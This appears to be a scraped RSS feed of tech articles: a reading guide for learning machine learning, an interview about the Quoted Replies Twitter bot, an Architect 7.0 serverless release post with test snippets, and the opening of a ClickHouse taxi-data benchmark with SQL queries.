<p>The subject of Artificial Intelligence picks my interest and I‚Äôm constantly studying and trying new things in this field.</p>
<p>It is notorious how the technologies related to Natural Language Processing, Computer Vision and such have emerged and evolved into solutions used by millions of users every day.</p>
<p>Even though people use the term "Artificial Intelligence", we are still far away from something as advanced as a Skynet from the Terminator movies.</p>
<p>The most common subfield of AI used today is the one called Machine Learning, which, in its turn, has Deep Learning as subfield steeply growing every day for quite some time now.</p>
<p>In this guide, I aim to describe a path to follow for software engineers to begin understanding how Machine Learning works and how to apply it to your projects.</p>
<p>Yeah, you can just go to Google API‚Äôs or Amazon and pick some magical API to do Speech Recognition for you, but the value of knowing how it works, why it works and even more, how to make your own API as a Service and tune it to your specific needs is incredible.</p>
<p>Remember, as a developer, every tool is a new power.</p>
<p>I‚Äôve read, watched and gone through all these resources until the end, even got a paid certification for some, even though it is not necessary to learn, I find myself more engaged to finish when I have some deadline and assessment to prove I actually learned the material.</p>
<p>Let‚Äôs dive into the topics.</p>
<h2>The Basics: Math!</h2>
<p>Maybe you never had the chance to study some college-level math, or you did study it but you can‚Äôt remember most of the stuff because JavaScript and CSS took all the memory of those topics away.</p>
<p>There are 3 topics you must know beforehand, or at least have a decent grasp of to follow any good material on ML and DL: Linear Algebra, Calculus and Statistics.</p>
<p>If you‚Äôd like to go deep in learning the math needed to ML and DL, you can look for MIT OpenCourseWare classes like Professor Strang‚Äôs renowned <a href="https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-spring-2010/">Linear Algebra</a> class.</p>
<p>I‚Äôve watched it in college in parallel with my regular class and it is very good.</p>
<p>But, let‚Äôs face it, most people have no time for that or the patience.</p>
<p>So I will give you the crash course for the 3 topics mentioned above.</p>
<h3>Linear Algebra</h3>
<p>Just watch the whole series <a href="https://www.youtube.com/watch?v=fNk_zzaMoSs&amp;list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Essence of Linear Algebra</a> from the Youtube channel 3Blue1Brown.</p>
<p>The guy makes visual explanations of once hard concepts incredibly easy!</p>
<p>It is very far in terms of content compared to Professor Strang‚Äôs, but it‚Äôs enough, to begin with, and you can go after other topics as you advance in ML and DL.</p>
<h3>Calculus</h3>
<p>Guess what?</p>
<p>3Blue1Brown also has a whole series on Calculus on Youtube for you to watch for free: <a href="https://www.youtube.com/watch?v=WUvTyaaNkzM&amp;list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr">Essence of Calculus</a>.</p>
<p>Again, he is very good at giving you the intuition of why and how rather than just throw some random equations on your face.</p>
<h3>Statistics</h3>
<p>This is a whole field that, in my opinion, you can learn as needed, a good reference is <a href="https://www.amazon.com/Practical-Statistics-Data-Scientists-Essential/dp/1491952962">Practical Statistics for Data Scientists: 50 Essential Concepts</a>.</p>
<p>An objective book with some good examples for every concept.</p>
<p>Fast to read too.</p>
<p>As the title implies, it is more suitable for Data Scientists, but understanding some basics of statistics is always good and this is what this is book is for.</p>
<p>You won‚Äôt become a statistician after reading it, but you will learn some good stuff.</p>
<h2>The Bypassed: Machine Learning</h2>
<p>Everybody wants to jump straight into Deep Learning and be the cool guy training a single model for a week on a 12GB GPU.</p>
<p>But to get Deep Learning right, you need to go through Machine Learning first!</p>
<h3>Start from the beginning</h3>
<p>The concepts, the train of thought, the "feeling" of how things work start here and there is no one else more capable of teaching those concepts than Professor Andrew Ng in his course <a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a>.</p>
<p>You may think this course is old and outdated, well, technology-wise, maybe, but conceptually-wise, it is better than anything else out there.</p>
<p>Professor Ng makes it easy to understand the math applied in every technique he teaches and gives you a solid understanding of what happens underneath in a very short and concise course.</p>
<p>All the exercises are made in Octave, a free version of Matlab of sorts, and you finish the course implementing your own Neural Network!</p>
<p>The syntax in Octave is easy to grasp for any programmer, so don‚Äôt let that be a barrier for you.</p>
<p>Once you finish the course, you will have implemented all the major algorithms and will be able to solve several prediction problems.</p>
<h3>Random Forests</h3>
<p>I said all the major algorithms, right?</p>
<p>Actually, there is but one flaw in Andrew Ng‚Äôs course, he doesn‚Äôt cover Random Forests.</p>
<p>An awesome complement to his course is fast.ai‚Äôs <a href="http://course18.fast.ai/ml">Introduction to Machine Learning for Coders</a>.</p>
<p>Jeremy Howard goes super practical on the missing piece in Ng‚Äôs course covering a topic that is, for many classical problems, the best solution out there.</p>
<p>Fast.ai‚Äôs approach is what is called Top-Down, meaning they show you how to solve the problem and then explain why it worked, which is the total opposite of what we are used to in school.</p>
<p>Jeremy also uses real-world tools and libraries, so you learn by coding in industry-tested solutions.</p>
<h2>Deep Learning</h2>
<p>Finally!</p>
<p>The reason why we are all here, Deep Learning!</p>
<p>Again, the best resource for it is Professor Ng‚Äôs course, actually, a series of courses.</p>
<p>The <a href="https://www.deeplearning.ai/deep-learning-specialization/">Deep Learning Specialization</a> is composed of 5 courses total going from the basics and evolving on specific topics such as language, images, and time-series data.</p>
<p>One nice thing is that he continues from the very end of his classical Machine Learning course, so it just feels like an extension of the first course.</p>
<p>The math, the concepts, the notion of how and why it works, he delivers it all very concisely like few I‚Äôve seen.</p>
<p>The only drawback is that he uses <a href="https://www.tensorflow.org/">Tensorflow</a> 1.x (Google‚Äôs DL Framework) in this course, but that‚Äôs minimal detail in my opinion since the explanations and exercises are so well delivered.</p>
<p>You can pick up the most recent version of the framework relatively easy and to do so there is the final piece of this guide, a book.</p>
<h3>Too much stuff, give me something faster</h3>
<p>This book might be the only thing you need to start, it is Aur√©lien G√©ron‚Äôs <a href="https://www.amazon.com.br/Hands-Machine-Learning-Scikit-Learn-TensorFlow-ebook/dp/B07XGF2G87">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow: Concepts, Tools, and Techniques to Build Intelligent Systems</a>.</p>
<p>It covers a lot, from classical Machine Learning to the most recent Deep Learning topics. Good examples and exercises using industry-grade frameworks and libraries.</p>
<p>I dare say that, if you are really in a rush, you can skip everything I said before and just go for the book.</p>
<p>You will miss a good amount of information contained on the other resources mentioned, but the practical and actionable knowledge from G√©ron‚Äôs book is enough to work on many ideas for your next project.</p>
<p>If you feel limited after only reading the book, go back and study the rest of the material, it will fill in the gaps you might have and give you a more solid understanding.</p>
<h2>What about Framework X or Y?</h2>
<p>"Hey, I‚Äôve heard about PyTorch and that other framework or library X everybody talks about".</p>
<p>As a Software Engineer, you know better than anyone how fast technology evolves.</p>
<p>Don‚Äôt go crazy for that, after you learn the basics in this guide, you can easily go, for instance, on <a href="https://pytorch.org/">PyTorch</a> documentation or any other library or framework of sorts and learn how to use it in a week or two.</p>
<p>The techniques, the concepts, are all the same, it is only a matter of syntax and application or even tastes that you might have for any given tool.</p>
<h2>Conclusion</h2>
<p>To wrap it up, I want to say that, even though it might seem a lot, I tried to remove all the noise and at the end of the process, you will feel confident that you understand what is happening behind the curtains, the jargons and even be able to read some papers published in the field to keep up with the latest advances.</p>
<p>TL;DR Here is the list of resources mentioned in sequence:</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=fNk_zzaMoSs&amp;list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Essence of Linear Algebra</a></li>
<li><a href="https://www.youtube.com/watch?v=WUvTyaaNkzM&amp;list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr">Essence of Calculus</a></li>
<li><a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a></li>
<li><a href="http://course18.fast.ai/ml">Introduction to Machine Learning for Coders</a></li>
<li><a href="https://www.deeplearning.ai/deep-learning-specialization/">Deep Learning Specialization</a></li>
<li><a href="https://www.amazon.com.br/Hands-Machine-Learning-Scikit-Learn-TensorFlow-ebook/dp/B07XGF2G87">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow: Concepts, Tools, and Techniques to Build Intelligent Systems</a></li>
</ul>
</div></div>]]>
            </description>
            <link>https://renanmf.com/machine-learning-and-deep-learning-software-engineers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519166</guid>
            <pubDate>Fri, 18 Sep 2020 16:59:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Twitter came to love my bot]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519052">thread link</a>) | @MarlonPro
<br/>
September 18, 2020 | https://restofworld.org/2020/quoted-replies-twitter-bot/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/quoted-replies-twitter-bot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><em>A few years ago, software engineer Dara Oladosu created a bot that collects all of the replies, retweets, and quotes of a tweet and sends them to users. It became Quoted Replies and earned him a </em><a href="https://www.cnn.com/2019/11/13/africa/nigerian-developer-gets-job-from-twitter-boss/index.html"><em>coveted job offer</em></a><em> from Twitter. Last month, Twitter </em><a href="https://twitter.com/Twitter/status/1260294888811347969"><em>released its own version of this feature</em></a><em> and credited Dara with </em><a href="https://twitter.com/rishair/status/1260319698865975296"><em>paving the way</em></a><em>.</em></p>



<h3><strong>It all started with a URL&nbsp;</strong></h3>



<p>I‚Äôm the kind of person who browses the internet a lot. Once in a while, I come across websites that can be improved. One can either contact the developers behind them to fix their sites, or build a browser extension that solves it on all websites. I prefer the second option.</p>



<p>The way Twitter is designed, by viewing a unique URL that references the tweet in question, you can see all the replies to that tweet. Someone on my timeline had <a href="https://twitter.com/supersanusi/status/1026407860383739905?s=20">asked for</a> recommendations, and I <a href="https://twitter.com/dara_tobi/status/1026423139956391936?s=20">replied with a unique URL</a>, so anyone interested could see all the recommendations. When I saw another tweet asking for another set of recommendations, I decided to build a fix.</p>



<p>I had just learned of Twitter‚Äôs streaming API then. This is Twitter‚Äôs way of sending you notifications when you subscribe to a person or name. Developers use the API to build ‚Äúlisteners,‚Äù tools that track mentions of a particular word or phrase. That‚Äôs how a lot of companies see complaints about them.</p>



<p>So I added the streaming API, plus certain keywords, the URL of the tweet, and some code in the background to make the<a href="https://chrome.google.com/webstore/detail/quoted-replies/gclkmaikpmlbiighmcliinfiahlfjfbf"> browser extension</a>. That became Quoted Replies. It is basically an unintended consequence of how Twitter was designed.&nbsp;</p>



<p>When <a href="https://technext.ng/2019/11/07/twitters-ceo-jack-dorsey-visits-cchub-as-part-of-his-nigerian-tour/">Jack Dorsey visited Lagos last year</a>, I just had to get into the event. You have to understand that I used to be a huge Twitter user, mostly between 2012 and 2017. When I finished talking about Quoted Replies, Kayvon, Twitter‚Äôs product lead, offered me <a href="https://techpoint.africa/2019/11/09/dara-oladosu-quoted-replies/">a job on the spot</a>. It is probably the best interview ever.</p>



<h3><strong>Sidestepping the spam problem&nbsp;</strong></h3>



<p>The bot initially had some issues. It used to <a href="https://twitter.com/QuotedReplies/status/1104084154889711616?s=20">tweet out some text with the URL</a> in response to a request, and this would lead to the account being shadow banned. When this happened, the URL in the tweet would not show up.&nbsp;</p>



<p>It took me six months to figure out that if I just removed the additional text and left the link, it would not spam Twitter. Twitter‚Äôs native code compresses any link, which incidentally makes each one unique. In July 2019, Quoted Replies made only 281,000 impressions, a metric that shows how many times tweets from that account were seen. But it really took off in September, thanks to the apps that my colleagues <a href="https://play.google.com/store/apps/details?id=com.hf.quotedreplies&amp;hl=en_US">Hamza Fetuga</a> and<a href="https://apps.apple.com/us/app/quoted-replies/id1476940595"> Hafeez Sagaya</a> built. In that month alone, the account had 25.9 million impressions, a 9,217% increase.</p>



<p>One thing that I wanted to do was to build in some anonymity, so in February, I rolled out a new feature for people to send a tweet to<a href="http://twitter.com/QuotedReplies"> @QuotedReplies</a> via direct messages, and the bot would reply with the link. This was a play again on another aspect of Twitter. The basic API has a limit of 2,400 tweets a day, and we were basically near that limit, but by using DMs, we can reduce the amount of tweets the bot makes and reply to people individually.&nbsp;</p>



<h3><strong>‚ÄúQuoted Replies is an entertainment tool‚Äù</strong></h3>



<p>I was actually happy when Twitter released the native feature that shows retweets with comments. Everyone knew Twitter was going to develop their own feature. I did not get to work on it like I had imagined when they offered me the job. I wasn‚Äôt <a href="https://twitter.com/rishair/status/1260319408779493377">a part of that team</a> at all. I used to wake up to multiple direct messages in my personal account from people asking me what was wrong with the bot when they did not receive a reply. In a way, some responsibility has been taken off my shoulders. I still work full-time in Lagos for Andela, but I have done small, one-off projects for Twitter, like <a href="https://hideunwantedreplies.com/">hideunwantedreplies.com</a>, as a contract worker.&nbsp;</p>



<p>Building Quoted Replies changed my perception of the way products should be built if you want users; it should be super simple, and there should be a real need. When people think of user needs, they think only that the product should be a painkiller, but now I think entertainment is right up there. Quoted Replies is an entertainment tool.</p>



<p>Personally, I‚Äôm <a href="https://twitter.com/dara_tobi/status/1255105552503451648">working on a new bot</a> that blocks tweets from accounts that include trending words so that their ads show up when you‚Äôre checking out trends. It‚Äôs easy to do in code, but I‚Äôm still figuring out how to manage the API requests so that the bot doesn‚Äôt get flagged. I‚Äôve learnt my lesson there. Maybe it could be a self-hosted package for users in the future.</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/quoted-replies-twitter-bot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519052</guid>
            <pubDate>Fri, 18 Sep 2020 16:49:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serverless framework Architect 7.0 released; defaults to httpapis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518999">thread link</a>) | @brianleroux
<br/>
September 18, 2020 | https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443?source=collection_home---4------0----------------------- | <a href="https://web.archive.org/web/*/https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443?source=collection_home---4------0-----------------------">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="b68f">By popular demand: API Gateway HTTP APIs are now the default in Architect serverless apps</h2><div><div><div><p><a href="https://blog.begin.com/@ryan?source=post_page-----c84df06cd443--------------------------------" rel="noopener"><img alt="Ryan Block" src="https://miro.medium.com/fit/c/96/96/2*EfV_5cNqDQE8MFejOm6FKg.png" width="48" height="48"></a></p></div></div></div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1996/1*w8l-oRuAMOvf6ICSmVXF4w.png" width="998" height="182" srcset="https://miro.medium.com/max/552/1*w8l-oRuAMOvf6ICSmVXF4w.png 276w, https://miro.medium.com/max/1104/1*w8l-oRuAMOvf6ICSmVXF4w.png 552w, https://miro.medium.com/max/1280/1*w8l-oRuAMOvf6ICSmVXF4w.png 640w, https://miro.medium.com/max/1400/1*w8l-oRuAMOvf6ICSmVXF4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*w8l-oRuAMOvf6ICSmVXF4w.png?q=20"></p></div></div></div></figure><p id="5007">OpenJSF Architect now powers thousands of serverless applications all over the world. Folks continue to tell us they value its focused, direct, stable, lock-in-free approach to building blazing fast modern web apps without ever having to manage a single server.</p><p id="caa4">Today we‚Äôre extremely excited to announce Architect 7 (Chupacabra), a major step forward in building serverless web apps and APIs with AWS.</p><p id="f7da">Chupacabra now deploys AWS API Gateway v2.0 (aka <code>HTTP</code>) APIs by default, and ships with a rewrite of Architect‚Äôs local development environment, Sandbox. The new Sandbox includes full local/offline support for building with <code>HTTP</code> APIs, and an even better interface for integrating Architect into your automated testing, from <code>tape</code> to <code>jest</code> (and everything in between).</p><p id="e527">Want to give it a go? Here‚Äôs the super quickstart, no AWS credentials required:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif" width="600" height="338" srcset="https://miro.medium.com/max/552/1*oRk_AWfRGDx0MzXJTmeYNw.gif 276w, https://miro.medium.com/max/1104/1*oRk_AWfRGDx0MzXJTmeYNw.gif 552w, https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif 600w" sizes="600px" data-old-src="https://miro.medium.com/freeze/max/60/1*oRk_AWfRGDx0MzXJTmeYNw.gif?q=20"></p></div></div></figure><p id="a9f0">First: <code>npm init @architect ./your-app-name</code> <br>Then: <code>npx arc sandbox<br></code><strong>That's it!</strong></p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1960/1*3FwfgGmDs6TR5RIpacUbYA.png" width="980" height="534" srcset="https://miro.medium.com/max/552/1*3FwfgGmDs6TR5RIpacUbYA.png 276w, https://miro.medium.com/max/1104/1*3FwfgGmDs6TR5RIpacUbYA.png 552w, https://miro.medium.com/max/1280/1*3FwfgGmDs6TR5RIpacUbYA.png 640w, https://miro.medium.com/max/1400/1*3FwfgGmDs6TR5RIpacUbYA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*3FwfgGmDs6TR5RIpacUbYA.png?q=20"></p></div></div></div></figure><p id="8191">For most applications most of the time, we now believe <code>HTTP</code> APIs are the right way to ship a serverless app on AWS. Compared to legacy <code>REST</code> APIs, there are some compelling reasons to use (and upgrade) to <code>HTTP</code>:</p><p id="cab4">- <code>HTTP</code> APIs are designed to be lower-latency<br>- <code>HTTP</code> APIs provision and update significantly faster<br>- <code>HTTP</code> APIs are far less expensive to operate: as of this writing, they cost ‚â§$1.00/million requests, compared to <code>REST</code> APIs, which charge $3.50/million requests (plus data transferred)<br>- <code>HTTP</code> APIs support default stages and routes, meaning we can finally escape the dreaded API Stage Path Part Problem (e.g. <code>/staging</code> in <code><a href="https://{id}.execute-api.{region}.amazonaws.com/staging%60" rel="noopener">https://{id}.execute-api.{region}.amazonaws.com/staging</a></code>)<br>- <code>HTTP</code> APIs are where AWS is now putting the bulk of its API Gateway development effort<br>- As of September 2020, <code>HTTP</code> APIs now support authorizers (which can be implemented via <a href="https://arc.codes/primitives/macros" rel="noopener">Architect Macros</a>)</p><p id="5527">Existing Architect projects can upgrade to <code>HTTP</code> APIs with a single command; learn more in the <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="3581">Architect 7 ships with a major upgrade to its local development and testing environment, <a href="https://github.com/architect/sandbox" rel="noopener">Sandbox 2.0</a>. Sandbox 2.0‚Äôs clean, unified testing interface enables granular controls for starting and stopping various local serverless services, and support for all major JS testing frameworks.</p><p id="8aa5">For example, here‚Äôs how to integrate Sandbox with two popular test libraries, <a href="https://github.com/substack/tape" rel="noopener">Tape</a> and <a href="https://jestjs.io/" rel="noopener">Jest</a>:</p><h2 id="b744">Tape</h2><pre><span id="4306">let sandbox = require('@architect/sandbox')<br>let test = require('tape)<p>test('Start the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.start()<br>  t.equal(result, 'Sandbox successfully started')<br>})</p><p>test('Tests go here', t =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</p><p>test('Shut down the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.end()<br>  t.equal(result, 'Sandbox successfully shut down')<br>})</p></span></pre><h2 id="ec26">Jest</h2><pre><span id="8c59">let sandbox = require('@architect/sandbox')</span><span id="261c">beforeAll(async () =&gt; {<br>  let result = await sandbox.start()<br>  expect(result).toBe('Sandbox successfully started')<br>})</span><span id="a76d">afterAll(async () =&gt; {<br>  let result = await sandbox.end()<br>  expect(result).toBe('Sandbox successfully shut down')<br>})</span><span id="f734">test('Tests go here', () =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</span></pre><p id="6635">Where possible, we‚Äôve taken every possible measure to ensure a seamless upgrade to Architect 7.x from 6.x (Ogopogo) and earlier. Architect 7.x is fully backward compatible, and continues to ship API Gateway REST APIs to existing Architect projects.</p><p id="d4e0">Changes to Sandbox may require minor settings updates for local workflows, and its new testing interface does remove support for some obscure, undocumented APIs.</p><p id="4e1d">To learn more, please check out our extensive <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="405a">We couldn‚Äôt do this work without the support and feedback of the Architect community, and of the folks at AWS working hard to make the future a little more serverless.</p><blockquote><p id="0890"><strong>More specifically, we‚Äôd like to give a shout out to:</strong><br>Akash Peri, Alan Tan, Khozema Ujjainwala, and the entire API Gateway team, Ali Servet Donmez, Andy Buckingham, Carter Rabasa, Fil Maj, Greg Allen, Gregor Martynus, Jordan Harband, Jory Burson, and Kris Borchers.</p></blockquote><p id="44e9">Since releasing Architect with the OpenJS Foundation, there have been over 390 releases ‚Äî with many <a href="https://github.com/architect/architect/issues/new/choose" rel="noopener">more to come based on your feedback</a> and <a href="https://github.com/architect/" rel="noopener">contributions</a>.</p><p id="1c93">Oh, and don‚Äôt forget to <a href="https://architecture-as-text.slack.com/archives/C6BGT0D08/p1600199636147600" rel="noopener">join the Architect conversation in Slack</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443?source=collection_home---4------0-----------------------</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518999</guid>
            <pubDate>Fri, 18 Sep 2020 16:46:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ClickHouse and Redshift Face Off Again in NYC Taxi Rides Benchmark]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518926">thread link</a>) | @krnaveen14
<br/>
September 18, 2020 | https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark | <a href="https://web.archive.org/web/*/https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	

	<p><h2>Setup</h2>
</p><p>We start with the latest ClickHouse version 20.6.6.44 running inside Kubernetes on an Amazon m5.8large EC2 instance. This is a mid-range instance with 32 vCPUs, 128GB of RAM and EBS gp2 storage, that is priced at $1.54 per hour or $36.86 per day in AWS. EBS users also have to pay for storage $3 per terabyte per day.</p><p><h2>Data loading</h2>
</p><p>In previous benchmarks using NYC Taxi Rides datasets, users had to go through a painful and lengthy data transformation process that could take hours. Those times are gone, thanks to contributions to ClickHouse by Altinity engineers. We can use new ClickHouse capabilities in order to load data directly from S3 bucket.&nbsp;</p><p>The data is stored in 96 gzip-ed CSV files, one file per month, several hundred MBs size each:</p><div><figure><img src="https://lh5.googleusercontent.com/MSo9vJvJ5mbEVh4J6xEThcSb7E3MG54byt3KsVSutWJsBJ11Jzqhaz4u_OxQwDWeqZGkwuSXJglvX8yAk0dCHv0oSpjmYo3omH4WgZtkfhhdm2oe_E2YMFoQJyF5_PNl3DAxsVOf" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The total size reported by Amazon is 37.3GB:</p><div><figure>
<p>nyc_taxi_rides/data/tripdata/<br>96 Objects ‚Äì 37.3 GB</p>
</figure>
</div><p>We are not going to do any transformations of the source data. Only minor tweakings of <a href="https://altinity.com/blog/2019/7/new-encodings-to-improve-clickhouse">table encodings</a> were applied:</p><div><pre><code>CREATE TABLE IF NOT EXISTS tripdata (
  pickup_date Date DEFAULT toDate(pickup_datetime) CODEC(Delta, LZ4),
  id UInt64,
  vendor_id String,
  pickup_datetime DateTime CODEC(Delta, LZ4),
  dropoff_datetime DateTime,
  passenger_count UInt8,
  trip_distance Float32,
  pickup_longitude Float32,
  pickup_latitude Float32,
  rate_code_id String,
  store_and_fwd_flag String,
  dropoff_longitude Float32,
  dropoff_latitude Float32,
  payment_type LowCardinality(String),
  fare_amount Float32,
  extra String,
  mta_tax Float32,
  tip_amount Float32,
  tolls_amount Float32,
  improvement_surcharge Float32,
  total_amount Float32,
  pickup_location_id UInt16,
  dropoff_location_id UInt16,
  junk1 String,
  junk2 String) 
ENGINE = MergeTree
PARTITION BY toYYYYMM(pickup_date) 
ORDER BY (vendor_id, pickup_location_id, pickup_datetime);</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><div><pre><code>set max_insert_threads=32;

INSERT INTO tripdata
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/data-20*.csv.gz', 
'CSVWithNames', 
'pickup_date Date, id UInt64, vendor_id String, pickup_datetime DateTime, dropoff_datetime DateTime, passenger_count UInt8, trip_distance Float32, pickup_longitude Float32, pickup_latitude Float32, rate_code_id String, store_and_fwd_flag String, dropoff_longitude Float32, dropoff_latitude Float32, payment_type LowCardinality(String), fare_amount Float32, extra String, mta_tax Float32, tip_amount Float32, tolls_amount Float32, improvement_surcharge Float32, total_amount Float32, pickup_location_id UInt16, dropoff_location_id UInt16, junk1 String, junk2 String', 'gzip');</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><p>The syntax is not standard; we use the ClickHouse table function ‚Äòs3()‚Äô in order to connect to and read from an S3 bucket. ClickHouse <a href="https://clickhouse.tech/docs/en/sql-reference/table-functions/">table functions</a> are a powerful extension technique that allows to integrate a DBMS with external data sources without changing the SQL syntax. ClickHouse has a bunch of those, and the ‚Äòs3()‚Äô table function is a welcome addition.</p><div><pre><code>0 rows in set. Elapsed: 280.696 sec. Processed 1.31 billion rows, 167.39 GB (4.67 million rows/s., 596.34 MB/s.) </code></pre>
</div><p>It takes less than 5 minutes in order to load 1.3 billion rows from the S3 bucket! Note that wildcards are used in order to load multiple files, and Clickhouse can process gzipped data natively as well!&nbsp;</p><p>In the same way we can load the ‚Äòtaxi_zones‚Äô table ‚Äî the table is small so loading is almost instantaneous from S3.</p><div><pre><code>CREATE TABLE IF NOT EXISTS taxi_zones (
  location_id UInt16,
  zone String,
  create_date Date DEFAULT toDate(0)
) 
ENGINE = MergeTree 
ORDER BY (location_id);

INSERT INTO taxi_zones
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/taxi_zones/data-*.csv.gz', 
'CSVWithNames', 'location_id UInt16, zone String, create_date Date', 'gzip');</code></pre>
</div><p>Once the data is loaded, it is a good practice to inspect table sizes:</p><div><pre><code>SELECT 
    table,
    sum(rows),
    sum(data_uncompressed_bytes) AS uc,
    sum(data_compressed_bytes) AS c,
    uc / c AS ratio
FROM system.parts
WHERE (database = 'default') AND active
GROUP BY table

‚îå‚îÄtable‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄsum(rows)‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄuc‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄc‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄratio‚îÄ‚îê
‚îÇ tripdata          ‚îÇ 1310903963 ‚îÇ 104469253248 ‚îÇ 37563206521 ‚îÇ 2.7811591778671945 ‚îÇ
‚îÇ taxi_zones        ‚îÇ        263 ‚îÇ         5495 ‚îÇ        3697 ‚îÇ 1.4863402758993778 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò</code></pre>
</div><p>As you can see, uncompressed data size is above 100GB, which lands in ClickHouse as 35GB for the main table with 2.8 times compression ratio. We usually expect ClickHouse to compress more aggressively, but the table has a lot of random floats that are hard to pack effectively.</p><p>The data loading process was very fast and convenient and it took us less than 10 minutes to get ready for queries.</p><p><h2>Queries</h2>
</p><p>Following Mark Litwintschik examples we used several simple queries in order to benchmark performance.</p><p>Q1. Group by a single column.</p><div><pre><code>SELECT 
    passenger_count,
    avg(total_amount)
FROM tripdata
GROUP BY passenger_count</code></pre>
</div><p>Q2. Group by two columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    count(*)
FROM tripdata
GROUP BY passenger_count, year</code></pre>
</div><p>Q3. Group by three columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    round(trip_distance) AS distance,
    count(*)
FROM tripdata
GROUP BY passenger_count, year, distance
ORDER BY year, count(*) DESC</code></pre>
</div><p>We have added two more queries to check joins.</p><p>Q4. Query with a JOIN to taxi_zones table</p><div><pre><code>SELECT 
    tz.zone AS zone,
    count() AS c
FROM tripdata AS td
LEFT JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
GROUP BY zone
ORDER BY c DESC</code></pre>
</div><p>Q5. Where condition on the joined table.</p><div><pre><code>SELECT count(*)
FROM tripdata AS td
INNER JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
WHERE tz.zone = 'Midtown East'</code></pre>
